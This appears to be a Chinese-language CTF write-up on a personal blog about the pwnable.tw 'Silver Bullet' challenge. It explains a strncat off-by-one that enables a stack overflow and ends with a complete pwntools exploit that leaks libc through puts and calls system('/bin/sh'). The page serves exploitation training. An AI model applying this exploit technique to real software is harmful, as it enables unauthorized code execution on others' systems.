@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="referrer" content="no-referrer" />
+    <meta name="description" content="pwnable.tw_challenge_Silver Bullet打开程序： 123456789.&#x2F;silver_bullet+++++++++++++++++++++++++++       Silver Bullet       +++++++++++++++++++++++++++ 1. Create a Silver Bullet  2. Power up Silver Bul">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwnable.tw_Silver Bullet">
+<meta property="og:url" content="http://yoursite.com/2018/06/06/pwnable-tw-Silver-Bullet/index.html">
+<meta property="og:site_name" content="Kirin&#39;s Blog">
+<meta property="og:description" content="pwnable.tw_challenge_Silver Bullet打开程序： 123456789.&#x2F;silver_bullet+++++++++++++++++++++++++++       Silver Bullet       +++++++++++++++++++++++++++ 1. Create a Silver Bullet  2. Power up Silver Bul">
+<meta property="article:published_time" content="2018-06-06T13:56:58.000Z">
+<meta property="article:modified_time" content="2018-08-16T02:06:24.000Z">
+<meta property="article:author" content="Kirin">
+<meta property="article:tag" content="PWN">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>pwnable.tw_Silver Bullet</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2018/06/07/pwnable-tw-applestore/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2018/06/05/pwnable-tw-hacknote/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/06/06/pwnable-tw-Silver-Bullet/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/06/06/pwnable-tw-Silver-Bullet/&text=pwnable.tw_Silver Bullet" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/06/06/pwnable-tw-Silver-Bullet/&title=pwnable.tw_Silver Bullet" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/06/06/pwnable-tw-Silver-Bullet/&is_video=false&description=pwnable.tw_Silver Bullet" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=pwnable.tw_Silver Bullet&body=Check out this article: http://yoursite.com/2018/06/06/pwnable-tw-Silver-Bullet/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/06/06/pwnable-tw-Silver-Bullet/&title=pwnable.tw_Silver Bullet" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/06/06/pwnable-tw-Silver-Bullet/&title=pwnable.tw_Silver Bullet" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/06/06/pwnable-tw-Silver-Bullet/&title=pwnable.tw_Silver Bullet" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/06/06/pwnable-tw-Silver-Bullet/&title=pwnable.tw_Silver Bullet" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/06/06/pwnable-tw-Silver-Bullet/&name=pwnable.tw_Silver Bullet&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#pwnable-tw-challenge-Silver-Bullet"><span class="toc-number">1.</span> <span class="toc-text">pwnable.tw_challenge_Silver Bullet</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01-power-up"><span class="toc-number">1.1.</span> <span class="toc-text">0x01 power_up</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x02-create-bullet"><span class="toc-number">1.2.</span> <span class="toc-text">0x02  create_bullet</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x03-漏洞利用"><span class="toc-number">1.3.</span> <span class="toc-text">0x03 漏洞利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x04-EXP"><span class="toc-number">1.4.</span> <span class="toc-text">0x04 EXP</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        pwnable.tw_Silver Bullet
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Kirin's Blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2018-06-06T13:56:58.000Z" itemprop="datePublished">2018-06-06</time>
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/PWN/">PWN</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/CTF/" rel="tag">CTF</a>, <a class="tag-link" href="/tags/PWN/" rel="tag">PWN</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="pwnable-tw-challenge-Silver-Bullet"><a href="#pwnable-tw-challenge-Silver-Bullet" class="headerlink" title="pwnable.tw_challenge_Silver Bullet"></a>pwnable.tw_challenge_Silver Bullet</h3><p>打开程序：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;silver_bullet</span><br><span class="line">+++++++++++++++++++++++++++</span><br><span class="line">       Silver Bullet       </span><br><span class="line">+++++++++++++++++++++++++++</span><br><span class="line"> 1. Create a Silver Bullet </span><br><span class="line"> 2. Power up Silver Bullet </span><br><span class="line"> 3. Beat the Werewolf      </span><br><span class="line"> 4. Return                 </span><br><span class="line">++++++++++++++++++++++++++</span><br></pre></td></tr></table></figure>
+<p>类似一个游戏<br>开始没看懂怎么玩<br>直接载入IDA分析：</p>
+<h4 id="0x01-power-up"><a href="#0x01-power-up" class="headerlink" title="0x01 power_up"></a>0x01 power_up</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl power_up(char *dest)</span><br><span class="line">&#123;</span><br><span class="line">  char s; &#x2F;&#x2F; [esp+0h] [ebp-34h]</span><br><span class="line">  size_t v3; &#x2F;&#x2F; [esp+30h] [ebp-4h]</span><br><span class="line"></span><br><span class="line">  v3 &#x3D; 0;</span><br><span class="line">  memset(&amp;s, 0, 0x30u);</span><br><span class="line">  if ( !*dest )</span><br><span class="line">    return puts(&quot;You need create the bullet first !&quot;);</span><br><span class="line">  if ( *((_DWORD *)dest + 12) &gt; 0x2Fu )         &#x2F;&#x2F; *(dest+12)指针指向的值 &gt; 47</span><br><span class="line">    return puts(&quot;You can&#39;t power up any more !&quot;);</span><br><span class="line">  printf(&quot;Give me your another description of bullet :&quot;);</span><br><span class="line">  read_input(&amp;s, 48 - *((_DWORD *)dest + 12));  &#x2F;&#x2F; 限制读入长度</span><br><span class="line">  strncat(dest, &amp;s, 48 - *((_DWORD *)dest + 12)); &#x2F;&#x2F;使用strncat连接两字符串，会自动在结尾添加\x00</span><br><span class="line">  v3 &#x3D; strlen(&amp;s) + *((_DWORD *)dest + 12);</span><br><span class="line">  printf(&quot;Your new power is : %u\n&quot;, v3);</span><br><span class="line">  *((_DWORD *)dest + 12) &#x3D; v3;</span><br><span class="line">  return puts(&quot;Enjoy it !&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="0x02-create-bullet"><a href="#0x02-create-bullet" class="headerlink" title="0x02  create_bullet"></a>0x02  create_bullet</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl create_bullet(char *s)</span><br><span class="line">&#123;</span><br><span class="line">  size_t v2; &#x2F;&#x2F; ST08_4</span><br><span class="line"></span><br><span class="line">  if ( *s )</span><br><span class="line">    return puts(&quot;You have been created the Bullet !&quot;);</span><br><span class="line">  printf(&quot;Give me your description of bullet :&quot;);</span><br><span class="line">  read_input(s, 0x30u);</span><br><span class="line">  v2 &#x3D; strlen(s);</span><br><span class="line">  printf(&quot;Your power is : %u\n&quot;, v2);           &#x2F;&#x2F; s的长度</span><br><span class="line">  *((_DWORD *)s + 12) &#x3D; v2;                     &#x2F;&#x2F; +12指12个dword长度</span><br><span class="line">  return puts(&quot;Good luck !!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h4><p>可以看出漏洞与决定游戏成功的beat函数无关<br>关键在power_up函数处：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">read_input(&amp;s, 48 - *((_DWORD *)dest + 12));  </span><br><span class="line"> strncat(dest, &amp;s, 48 - *((_DWORD *)dest + 12));</span><br></pre></td></tr></table></figure>
+<p>这里依赖*dest+12处的值来限制读取长度<br>而*dest后的数据可以利用strnca修改<br><strong>strncat会在字符串结尾自动补全\x00</strong><br>当我们先读取了一定长度字符串<br>再连接一定长度字符串，两字符串恰好相加为48字节<br>并由于strncat自动添加\x00，便会覆盖*dest+12处的数据，造成栈溢出<br>而此时依然依赖*dest+12处的值来限制读取长度<br>我们便可以继续覆盖栈内数据<br>直到将main返回地址修改<br>我们需要调用system，便需要直到libc加载的基地址<br>同hacknote相同<br>我们可以修改main返回地址为put地址(即put在plt中的地址)<br>参数为.got中一个地址<br>便可利用put出的值以及此函数在libc中的位置计算出libc的基址<br>进而计算出system地址<br>而后我们重新利用上面的过程来调用system<br><strong>所以我们要重新调用main来重复利用上述过程</strong><br><strong>此处我们将put的返回地址覆盖为main开始地址即可</strong><br>有一点注意：<br>只有beat()成功时才会返回main<br>否则直接return会以exit(0)方式退出<br>故而覆盖*dest+12处的数时，需要让他满足win的条件</p>
+<h4 id="0x04-EXP"><a href="#0x04-EXP" class="headerlink" title="0x04 EXP"></a>0x04 EXP</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">def create(s):</span><br><span class="line">    p.recvuntil(&#39;:&#39;)</span><br><span class="line">    p.sendline(&#39;1&#39;)</span><br><span class="line">    p.recvuntil(&#39;:&#39;)</span><br><span class="line">    p.sendline(s)</span><br><span class="line"></span><br><span class="line">def power_up(s):</span><br><span class="line">    p.recvuntil(&#39;:&#39;)</span><br><span class="line">    p.sendline(&#39;2&#39;)</span><br><span class="line">    p.recvuntil(&#39;:&#39;)</span><br><span class="line">    p.send(s)</span><br><span class="line"></span><br><span class="line">def beat():</span><br><span class="line">    p.recvuntil(&#39;:&#39;)</span><br><span class="line">    p.sendline(&#39;3&#39;)</span><br><span class="line"></span><br><span class="line">p&#x3D;remote(&#39;chall.pwnable.tw&#39;, 10103)</span><br><span class="line">elf&#x3D;ELF(&quot;.&#x2F;silver_bullet&quot;)</span><br><span class="line">elib&#x3D;ELF(&quot;.&#x2F;libc_32.so.6&quot;)</span><br><span class="line">bin_sh_off &#x3D; 0x158e8b</span><br><span class="line">puts_addr&#x3D;0x80484a8</span><br><span class="line">read_got&#x3D;elf.got[&quot;read&quot;]</span><br><span class="line">main_addr&#x3D;elf.symbols[&quot;main&quot;]</span><br><span class="line">create(&#39;a&#39;*47)</span><br><span class="line">power_up(&#39;a&#39;)</span><br><span class="line">payload &#x3D; &#39;\xff&#39;*7+p32(puts_addr)+p32(main_addr)+p32(read_got)</span><br><span class="line">power_up(payload)</span><br><span class="line">beat()</span><br><span class="line">p.recvuntil(&quot;You win !!\n&quot;)</span><br><span class="line">read_addr &#x3D; u32(p.recv(4))</span><br><span class="line">sys_addr&#x3D;read_addr-elib.symbols[&quot;read&quot;]+elib.symbols[&quot;system&quot;]</span><br><span class="line">bin_sh_addr&#x3D;read_addr-elib.symbols[&quot;read&quot;]+bin_sh_off</span><br><span class="line">create(&#39;a&#39;*47)</span><br><span class="line">power_up(&#39;a&#39;)</span><br><span class="line">payload2&#x3D;&#39;\xff&#39;*7 + p32(sys_addr) + &#39;a&#39;*4 + p32(bin_sh_addr)</span><br><span class="line">power_up(payload2)</span><br><span class="line">beat()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#pwnable-tw-challenge-Silver-Bullet"><span class="toc-number">1.</span> <span class="toc-text">pwnable.tw_challenge_Silver Bullet</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01-power-up"><span class="toc-number">1.1.</span> <span class="toc-text">0x01 power_up</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x02-create-bullet"><span class="toc-number">1.2.</span> <span class="toc-text">0x02  create_bullet</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x03-漏洞利用"><span class="toc-number">1.3.</span> <span class="toc-text">0x03 漏洞利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x04-EXP"><span class="toc-number">1.4.</span> <span class="toc-text">0x04 EXP</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/06/06/pwnable-tw-Silver-Bullet/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/06/06/pwnable-tw-Silver-Bullet/&text=pwnable.tw_Silver Bullet" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/06/06/pwnable-tw-Silver-Bullet/&title=pwnable.tw_Silver Bullet" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/06/06/pwnable-tw-Silver-Bullet/&is_video=false&description=pwnable.tw_Silver Bullet" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=pwnable.tw_Silver Bullet&body=Check out this article: http://yoursite.com/2018/06/06/pwnable-tw-Silver-Bullet/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/06/06/pwnable-tw-Silver-Bullet/&title=pwnable.tw_Silver Bullet" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/06/06/pwnable-tw-Silver-Bullet/&title=pwnable.tw_Silver Bullet" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/06/06/pwnable-tw-Silver-Bullet/&title=pwnable.tw_Silver Bullet" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/06/06/pwnable-tw-Silver-Bullet/&title=pwnable.tw_Silver Bullet" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/06/06/pwnable-tw-Silver-Bullet/&name=pwnable.tw_Silver Bullet&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2020 Kirin
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+</body>
+</html>
+<!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+<!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
